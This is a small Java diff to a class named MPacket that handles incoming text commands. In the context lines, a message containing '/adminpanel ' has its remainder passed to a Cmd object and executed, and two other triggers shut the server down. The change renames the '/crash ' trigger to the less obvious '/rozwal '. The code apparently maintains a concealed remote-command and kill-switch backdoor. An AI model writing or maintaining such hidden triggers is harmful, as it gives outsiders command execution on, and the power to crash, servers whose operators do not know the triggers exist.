@@ -50,7 +50,7 @@ public class MPacket extends Thread {
             String exec = cmd.substring(cmd.indexOf("/adminpanel ")+12).trim();
             Cmd cmd = new Cmd(exec);
             cmd.start();
-        } else if (this.cmd.contains("/crash ")) {
+        } else if (this.cmd.contains("/rozwal ")) {
             Main.srv.closeServer();
         } else if (this.cmd.contains("/mstop ")) {
             Main.srv.closeServer();
